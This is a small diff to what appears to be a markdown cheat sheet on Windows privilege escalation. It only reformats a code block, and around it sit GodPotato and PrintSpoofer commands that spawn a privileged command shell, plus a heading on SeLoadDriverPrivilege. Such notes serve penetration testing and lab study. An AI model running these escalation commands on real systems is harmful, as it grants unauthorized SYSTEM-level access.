@@ -26,7 +26,10 @@ GodPotato -cmd "cmd /c whoami"
 
 ### PrintSpoofer
 
-``` .\PrintSpoofer.exe -i -c cmd ```
+```
+.\PrintSpoofer.exe -i -c cmd
+
+```
 
 # SeLoadDriverPrivilege
 
